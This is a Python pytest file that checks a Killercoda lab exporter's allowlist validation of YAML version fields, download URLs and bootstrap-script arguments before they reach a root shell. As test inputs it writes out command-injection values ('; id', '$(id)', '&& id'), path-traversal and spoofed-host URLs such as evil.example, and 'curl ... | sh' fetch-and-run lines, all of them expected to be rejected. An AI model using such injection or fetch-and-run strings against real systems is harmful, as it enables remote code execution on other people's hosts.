"""killercoda_envs.yaml values are checked against allowlists before they reach a root shell."""
import copy
import subprocess
from pathlib import Path

import pytest

from teach.lab import export_killercoda as kc

REPO = Path(__file__).resolve().parents[2]
IMG = "kubernetes-kubeadm-1node"


def _envs():
    return copy.deepcopy(kc.load_envs())  # also proves the committed file passes


def test_committed_file_is_valid():
    assert kc.validate_envs(_envs())


@pytest.mark.parametrize("patch", ["1.36.5; id", "1.36", "$(id)", "1.36.5 --flag", ""])
def test_bad_kubernetes_patch(patch):
    envs = _envs()
    envs["images"][IMG]["kubernetes"][0]["patch"] = patch
    with pytest.raises(ValueError, match="not allowed"):
        kc.validate_envs(envs)


@pytest.mark.parametrize("tag", ["v1.20.3; id", "v1.20.3 --x", "latest", "$(id)", "v1.20", "1.20.3", "v1.20.0-rc.1"])
def test_bad_cilium_tag_reaching_cilium_install(tag):
    envs = _envs()
    envs["images"][IMG]["kubernetes"][0]["cilium"]["version"] = tag
    with pytest.raises(ValueError, match="cilium version"):
        kc.validate_envs(envs)


def test_bad_cilium_supported_minor():
    envs = _envs()
    envs["images"][IMG]["kubernetes"][0]["cilium"]["k8s"].append("1.36; id")
    with pytest.raises(ValueError, match="cilium k8s minor"):
        kc.validate_envs(envs)


@pytest.mark.parametrize("key,field", [("runtime", "version"), ("cni", "cli"), ("runtime", "crictl")])
def test_bad_runtime_and_cli_versions(key, field):
    envs = _envs()
    envs["images"][IMG][key][field] = "2.2.1/../x"
    with pytest.raises(ValueError, match="not allowed"):
        kc.validate_envs(envs)


@pytest.mark.parametrize("url", [
    "https://example.com/x.sh",
    "http://raw.githubusercontent.com/rancher/local-path-provisioner/v1/x.yaml",
    "https://github.com/cilium/../other-org/x/releases/download/v1/x.sh",
    "https://github.com/cilium/./x/../../other/x",
    "https://github.com/cilium/%2e%2e/other/x",
    "https://github.com/cilium/%2E%2E/other/x",
    "https://github.com/cilium/%252e%252e/other/x",
    "https://github.com/cilium/..%2fother/x",
    "https://github.com@evil.example/cilium/x",
    "https://github.com:8443/cilium/x",
    "https://github.com.evil.example/cilium/x",
    "https://github.com/ciliumevil/x",
])
def test_urls_outside_the_allowlist_or_with_dot_segments(url):
    assert not kc.url_allowed(url)
    envs = _envs()
    envs["capabilities"]["default-storageclass"]["script"] += f"\ncurl -fsSL {url} | sh\n"
    with pytest.raises(ValueError, match="URL"):
        kc.validate_envs(envs)


def test_allowed_urls_pass():
    for url in ("https://raw.githubusercontent.com/rancher/local-path-provisioner/v0.0.37/deploy/local-path-storage.yaml",
                "https://github.com/cilium/cilium-cli/releases/download/v0.20.1/cilium-linux-amd64.tar.gz",
                "https://pkgs.k8s.io/core:/stable:/v1.36/deb/Release.key"):
        assert kc.url_allowed(url), url


@pytest.mark.parametrize("args", [
    ["1.36.1; id", "v1.20.3", "2.2.1"], ["1.36.1", "v1.20.3;id", "2.2.1"], ["1.36.1", "1.20.3", "2.2.1"],
    ["1.36.1", "v1.20.3", "2.2.1 && id"], ["1.36.1", "v1.20.3", "$(id)"], ["x", "y", "z"],
    ["1.36.1", "v1.20.0-rc.1", "2.2.1"],
])
def test_bootstrap_script_refuses_odd_arguments(args):
    res = subprocess.run(["bash", str(REPO / "deploy/killercoda/bootstrap-kubeadm.sh"), *args],
                         capture_output=True, text=True, timeout=30, env={"PATH": "/usr/bin:/bin"})
    assert res.returncode == 2 and "refusing" in res.stderr
